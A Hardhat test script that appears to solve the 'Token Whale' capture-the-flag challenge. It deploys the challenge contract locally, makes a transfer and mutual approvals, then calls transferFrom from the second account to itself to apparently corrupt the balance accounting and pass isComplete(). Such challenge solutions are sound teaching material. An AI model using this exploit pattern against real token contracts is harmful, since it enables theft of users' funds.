const { expect } = require("chai");
const { assert } = require("console");
const { ethers, hardhatArguments } = require("hardhat");

let accounts;
let acc;
let acc1;
let game;

before(async () => {
  accounts = await ethers.getSigners();
  acc = accounts[0];
  acc1 = accounts[1]
  game = await ethers.getContractFactory("TokenWhaleChallenge")
      .then((factory) => factory.deploy(acc.address));

});

it("solves token whale", async function () {
  console.log("whale:", game.address)
  
  // const balance = await ethers.provider.getBalance(acc);
  // const tokBal = await game.balanceOf(acc)

  const tx = await game.transfer(acc1.address, 501)
  await tx.wait()
  console.log("before")
  console.log("bal acc: ", await game.balanceOf(acc.address))
  console.log("bal acc1: ", await game.balanceOf(acc1.address))

  const appr = await game.connect(acc1).approve(acc.address, 1000)
  await appr.wait()

  const appr1 = await game.connect(acc).approve(acc1.address, 1000)
  await appr1.wait()

  const tx1 = await game.transferFrom(acc1.address, acc1.address, 500)
  await tx1.wait()
  const isComplete = await game.isComplete()
  expect(isComplete).to.be.true;
  console.log("after")
  console.log("bal acc: ", await game.balanceOf(acc.address))
  console.log("bal acc1: ", await game.balanceOf(acc1.address))
});

 